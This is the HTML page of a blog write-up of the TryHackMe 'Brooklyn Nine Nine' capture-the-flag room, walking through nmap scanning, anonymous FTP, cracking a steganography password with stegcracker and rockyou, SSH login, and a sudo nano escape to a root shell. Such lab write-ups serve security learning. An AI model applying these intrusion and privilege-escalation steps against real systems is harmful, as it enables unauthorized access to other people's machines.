@@ -1,0 +1,288 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="utf-8">
+	<title>Brooklyn Nine Nine - Monk who code</title>
+
+  <!-- Edit site and author settings in `_config.yml` to make the social details your own -->
+
+    <meta content="Monk who code" property="og:site_name">
+  
+    <meta content="Brooklyn Nine Nine" property="og:title">
+  
+  
+    <meta content="article" property="og:type">
+  
+  
+    <meta content="Write an awesome description for your new site here. You can edit this line in _config.yml. It will appear in your document head meta (for Google search results) and in your feed.xml site description.
+" property="og:description">
+  
+  
+    <meta content="http://localhost:4000/brooklyn-nine-nine/" property="og:url">
+  
+  
+    <meta content="2023-02-20T18:00:00+05:30" property="article:published_time">
+    <meta content="http://localhost:4000/about/" property="article:author">
+  
+  
+    <meta content="http://localhost:4000/assets/img/brooklyn.jpg" property="og:image">
+  
+  
+    
+    <meta content="THM writeup" property="article:section">
+    
+  
+  
+    
+    <meta content="flags" property="article:tag">
+    
+    <meta content="hacking" property="article:tag">
+    
+    <meta content="tryhackme" property="article:tag">
+    
+  
+
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:site" content="@">
+    <meta name="twitter:creator" content="@">
+  
+    <meta name="twitter:title" content="Brooklyn Nine Nine">
+  
+  
+    <meta name="twitter:url" content="http://localhost:4000/brooklyn-nine-nine/">
+  
+  
+    <meta name="twitter:description" content="Write an awesome description for your new site here. You can edit this line in _config.yml. It will appear in your document head meta (for Google search results) and in your feed.xml site description.
+">
+  
+  
+    <meta name="twitter:image:src" content="http://localhost:4000/assets/img/brooklyn.jpg">
+  
+
+	<meta name="description" content="">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+	<meta property="og:image" content="">
+	<link rel="shortcut icon" href="/assets/img/favicon/favicon.ico" type="image/x-icon">
+	<link rel="apple-touch-icon" href="/assets/img/favicon/apple-touch-icon.png">
+	<link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicon/apple-touch-icon-72x72.png">
+	<link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicon/apple-touch-icon-144x144.png">
+	<!-- Chrome, Firefox OS and Opera -->
+	<meta name="theme-color" content="#263959">
+	<!-- Windows Phone -->
+	<meta name="msapplication-navbutton-color" content="#263959">
+	<!-- iOS Safari -->
+	<meta name="apple-mobile-web-app-status-bar-style" content="#263959">
+	<!-- Google Fonts -->
+	<link href="https://fonts.googleapis.com/css?family=PT+Serif:400,700|Lato:300,400,700&display=swap" rel="stylesheet">
+	<!-- Font Awesome -->
+	<link rel="stylesheet" href="/assets/fonts/font-awesome/css/font-awesome.min.css">
+	<!-- Styles -->
+	<link rel="stylesheet" href="/assets/css/main.css">
+</head>
+
+<body>
+
+  <div class="wrapper">
+    <aside class="sidebar">
+  <header>
+    <div class="about">
+      <div class="cover-author-image">
+        <a href="/"><img src="/assets/img/david-freeman.jpg" alt="Monk Who Code"></a>
+      </div>
+      <div class="author-name">Monk Who Code</div>
+      <div style="width:150px; height:80px;"><script src="https://tryhackme.com/badge/1025686"></script></div>
+      <p>Some one searching for meaning of life as well as the sides of Tech. Always hungry to keep learning.</p>
+    </div>
+  </header> <!-- End Header -->
+  <footer>
+    <section class="contact">
+      <h3 class="contact-title">Contact me</h3>
+      <ul>
+        
+          <li><a href="https://twitter.com/" target="_blank"><i class="fa fa-twitter" aria-hidden="true"></i></a></li>
+        <!-- 
+        
+          <li><a href="https://facebook.com/" target="_blank"><i class="fa fa-facebook" aria-hidden="true"></i></a></li> -->
+        
+        
+          <li class="github"><a href="http://github.com/mannu-505" target="_blank"><i class="fa fa-github"></i></a></li>
+        
+        
+          <li class="linkedin"><a href="https://in.linkedin.com/" target="_blank"><i class="fa fa-linkedin" aria-hidden="true"></i></a></li>
+        
+        
+          <li class="email"><a href="mailto:student970505@gmail.com"><i class="fa fa-envelope-o"></i></a></li>
+        
+      </ul>
+    </section> <!-- End Section Contact -->
+    <div class="copyright">
+      <p>2025 &copy; Monk Who Code</p>
+    </div>
+  </footer> <!-- End Footer -->
+</aside> <!-- End Sidebar -->
+<div class="content-box clearfix">
+  <article class="article-page">
+  <div class="page-content">
+    
+    <div class="page-cover-image">
+      <figure>
+        <img class="page-image" src=/assets/img/brooklyn.jpg alt="Brooklyn Nine Nine">
+        
+      </figure>
+    </div> <!-- End Page Cover Image -->
+    
+    <div class="wrap-content">
+      <header class="header-page">
+        <h1 class="page-title">Brooklyn Nine Nine</h1>
+        <div class="page-date"><span>2023, Feb 20&nbsp;&nbsp;&nbsp;&nbsp;</span></div>
+      </header>
+      <h2 id="brooklyn-nine-nine">Brooklyn Nine Nine</h2>
+<p><a href="https://tryhackme.com/room/brooklynninenine">https://tryhackme.com/room/brooklynninenine</a></p>
+
+<h3 id="objective">Objective:</h3>
+<p>Capture the two flags.</p>
+
+<h3 id="difficulty">Difficulty:</h3>
+<p>Easy</p>
+
+<h3 id="enumeration">#Enumeration</h3>
+<p>we will start with nmap by using the following command.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-A</span> 10.10.32.149 <span class="nt">-r</span>
+</code></pre></div></div>
+
+<p>In the result of nmap we can see there are three ports open on machine ssh,ftp,and http.</p>
+
+<div class="language-bash nolineno highlighter-rouge"><div class="highlight"><pre class="highlight"><code>21/tcp open  ftp     vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed <span class="o">(</span>FTP code 230<span class="o">)</span>
+|_-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:10.17.23.18
+|      Logged <span class="k">in </span>as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session <span class="nb">timeout </span><span class="k">in </span>seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 4
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   2048 167f2ffe0fba98777d6d3eb62572c6a3 <span class="o">(</span>RSA<span class="o">)</span>
+|   256 2e3b61594bc429b5e858396f6fe99bee <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 ab162e79203c9b0a019c8c4426015804 <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp open  http    Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
+|_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title: Site doesn<span class="s1">'t have a title (text/html).
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+</span></code></pre></div></div>
+
+<p>the ftp server allows anonymous login so i tried to login in ftp server and check the list of files. there is a file named <em>note_to_jake.txt</em></p>
+
+<p>I downloaded the file to my computer and checked its content. which shows its a note to jake to change his password.</p>
+
+<blockquote>
+  <p>From Amy,</p>
+</blockquote>
+
+<blockquote>
+  <p>Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine</p>
+</blockquote>
+
+<p>try the http, tried the gobuster for directories but no luck with that. so on inspecting the <em>page elements</em> found there is comment showing that there might be steganography on the image. for further inspection downloaded the image and tried binwalk and steghide but no better luck with those too.</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;/p&gt;</span>This example creates a full page background image. Try to resize the browser window to see how it always will cover the full screen (when scrolled to top), and that it scales nicely on all screen sizes.<span class="nt">&lt;/p&gt;</span>
+<span class="c">&lt;!-- Have you ever heard of steganography? --&gt;</span>
+</code></pre></div></div>
+
+<p>at last tried stegcracker for cracking password of image and it worked.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>stegcracker brooklyn99.jpg wordlists/rockyou.txt
+</code></pre></div></div>
+
+<div class="language-bash nolineno highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Counting lines <span class="k">in </span>wordlist..
+Attacking file <span class="s1">'/Users/sentinel/Downloads/brooklyn99.jpg'</span> with wordlist <span class="s1">'../wordlists/rockyou.txt'</span>..
+Successfully cracked file with password: admin
+Tried 20330 passwords
+Your file has been written to: /Users/sentinel/Downloads/brooklyn99.jpg.out
+admin
+</code></pre></div></div>
+
+<p>so found the password for holt, now login to ssh using the hold’s password and check for the files there is a user flag that is first flag.</p>
+
+<div class="language-bash nolineno highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh holt@10.10.32.149
+holt@10.10.32.149<span class="s1">'s password: 
+Last login: Tue May 26 08:59:00 2020 from 10.10.10.18
+holt@brookly_nine_nine:~$ ls
+nano.save  user.txt
+</span></code></pre></div></div>
+
+<blockquote>
+  <p>cat user.txt</p>
+</blockquote>
+
+<p>and you will get your first flag.</p>
+
+<p>To escalate priviledge first check for sudo permission and found the holt have the permission to use /bin/nano as sudo without any password .</p>
+
+<blockquote>
+  <p>sudo -l</p>
+</blockquote>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Matching Defaults entries for holt on brookly_nine_nine:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User holt may run the following commands on brookly_nine_nine:
+    (ALL) NOPASSWD: /bin/nano
+</code></pre></div></div>
+
+<p>use the <em>/bin/nano</em> file to access root flag.</p>
+
+<div class="language-bash nolineno highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo</span> /bin/nano /root/root.text
+</code></pre></div></div>
+
+<blockquote class="prompt-tip">
+  <p>you can use “sudo /bin/nano -s /bin/sh” then write “/bin/sh” in nano and press “ctrl+t” or “^T” for full root shell to check flag as mentioned in GTFOBins.</p>
+</blockquote>
+
+
+      <div class="page-footer">
+        <div class="page-share">
+          <a href="https://twitter.com/intent/tweet?text=Brooklyn Nine Nine&url=http://localhost:4000/brooklyn-nine-nine/" title="Share on Twitter" rel="nofollow" target="_blank">Twitter</a>
+          <a href="https://facebook.com/sharer.php?u=http://localhost:4000/brooklyn-nine-nine/" title="Share on Facebook" rel="nofollow" target="_blank">Facebook</a>
+          <a href="https://plus.google.com/share?url=http://localhost:4000/brooklyn-nine-nine/" title="Share on Google+" rel="nofollow" target="_blank">Google+</a>
+        </div>
+        <div class="page-tag">
+          
+            <a href="/tags#flags" class="tag">&#35; flags</a>
+          
+            <a href="/tags#hacking" class="tag">&#35; hacking</a>
+          
+            <a href="/tags#tryhackme" class="tag">&#35; tryhackme</a>
+          
+        </div>
+      </div>
+    </div> <!-- End Wrap Content -->
+  </div> <!-- End Page Content -->
+</article> <!-- End Article Page -->
+
+</div>
+
+  </div>
+  
+  <script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+  ga('create', '', 'auto');
+  ga('send', 'pageview');
+</script> <!-- End Analytics -->
+
+</body>
+</html>
